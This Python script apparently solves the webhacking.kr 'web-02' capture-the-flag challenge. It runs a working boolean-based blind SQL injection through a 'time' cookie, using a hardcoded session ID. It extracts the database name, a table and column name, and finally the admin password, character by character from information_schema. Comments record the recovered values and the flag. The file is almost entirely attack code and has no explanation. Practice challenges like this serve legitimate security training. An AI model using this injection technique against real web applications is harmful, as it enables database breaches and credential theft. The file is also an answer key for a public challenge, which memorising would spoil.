import requests
import string

s = string.ascii_lowercase + string.digits + "_"

url = "https://webhacking.kr/challenge/web-02/"

db_name = ""
length_db = 0
table_name = ""
length_table = 0
column_name = ""
length_column = 0
length_password = 0
password = ""

#################### GET LENGTH OF DB #######################
for i in range(1,50):
	time = "1619795590 and length(database())= {}".format(i)
	payload = {
		"time": time,
		"PHPSESSID" : "5uqko8g83cdr7l209ck5fnof9u"
	}

	r = requests.get(url, cookies=payload)
	if("09:00:01" in r.text):
		print('yeppp')
		print(i)
		length_db += i
		break
	else:
		print("failed {}".format(i))
print("LENGTH OF DB %d" %length_db)

# length_db = 6
##################### GET DB ##################
for i in range(1,length_db + 1):
	for j in s:
		time = "1619795590 and substring(database(), {}, 1)= '{}'".format(i, j)
		payload = {
			"time": time,
			"PHPSESSID" : "5uqko8g83cdr7l209ck5fnof9u"
		}

		r = requests.get(url, cookies=payload)
		if("09:00:01" in r.text):
			print('yeppp')
			print(j)
			db_name += j
			break
		else:
			print("failed {}".format(j))
print("NAME OF DB %s" % db_name)
# db_name = 'chall2'

################## GET LENGTH OF TABLE ########################

for i in range(1, 50):
	time = "1619795590 and length((select table_name from information_schema.tables where table_schema='chall2' limit 0,1)) = {}".format(i)

	payload = {
			"time": time,
			"PHPSESSID" : "5uqko8g83cdr7l209ck5fnof9u"
		}

	r = requests.get(url, cookies=payload)
	if("09:00:01" in r.text):
		print('yeppp')
		print(i)
		length_table += i
		break
	else:
		print("failed {}".format(i))
print("LENGTH OF TABLE %d" % length_table)
# length_table  = 13

#################### GET TABLE ####################

for i in range(1,length_table + 1):
	for j in s:
		time = "1619795590 and substring((select table_name from information_schema.tables where table_schema='chall2' limit 0,1), {}, 1) = '{}'".format(i,j)

		payload = {
				"time": time,
				"PHPSESSID" : "5uqko8g83cdr7l209ck5fnof9u"
			}

		r = requests.get(url, cookies=payload)
		if("09:00:01" in r.text):
			print('yeppp')
			print(j)
			table_name += j
			break
		else:
			print("failed {}".format(j))
print("NAME OF TABLE %s" % table_name)
# table_name = admin_area_pw


################### GET LENGTH COLUMN ########################
for i in range(1, 50):
	time = "1619795590 and length((select column_name from information_schema.columns where table_name='admin_area_pw' limit 0,1)) = {}".format(i)

	payload = {
			"time": time,
			"PHPSESSID" : "5uqko8g83cdr7l209ck5fnof9u"
		}

	r = requests.get(url, cookies=payload)
	if("09:00:01" in r.text):
		print('yeppp')
		print(i)
		length_column += i
		break
	else:
		print("failed {}".format(i))
print("LENGTH OF COLUMN %d" %  length_column)
# length_column = 2

################### GET NAME COLUMN #####################
for i in range(1,length_column + 1):
	for j in s:
		time = "1619795590 and substring((select column_name from information_schema.columns where table_name='admin_area_pw' limit 0,1), {}, 1) = '{}'".format(i,j)

		payload = {
				"time": time,
				"PHPSESSID" : "5uqko8g83cdr7l209ck5fnof9u"	
			}

		r = requests.get(url, cookies=payload)
		if("09:00:01" in r.text):
			print('yeppp')
			print(j)
			column_name += j
			break
		else:
			print("failed {}".format(j))
print("NAME OF COLUMN %s" % column_name)
# column_name = "pw"

################### GET LENGTH OF PASSWORD #####################
for i in range(1, 50):
	time = "1619795590 and length((select pw from admin_area_pw)) = {}".format(i)

	payload = {
			"time": time,
			"PHPSESSID" : "5uqko8g83cdr7l209ck5fnof9u"
		}

	r = requests.get(url, cookies=payload)
	if("09:00:01" in r.text):
		print('yeppp')
		print(i)
		length_password += i
		break
	else:
		print("failed {}".format(i))

print("LENGTH OF PASSWORD %d" % length_password)

# length_password = 17

################# GET PASSWORD #####################
for i in range(1, length_password + 1):
	for j in s:
		time = "1619795590 and substring((select pw from admin_area_pw), {}, 1) = '{}'".format(i,j)

		payload = {
				"time": time,
				"PHPSESSID" : "5uqko8g83cdr7l209ck5fnof9u"	
			}

		r = requests.get(url, cookies=payload)
		if("09:00:01" in r.text):
			print('yeppp')
			print(j)
			password+= j
			break
		else:
			print("failed {}".format(j))

print("PASSWORD IS %s" % password)

# kudos_to_beistlab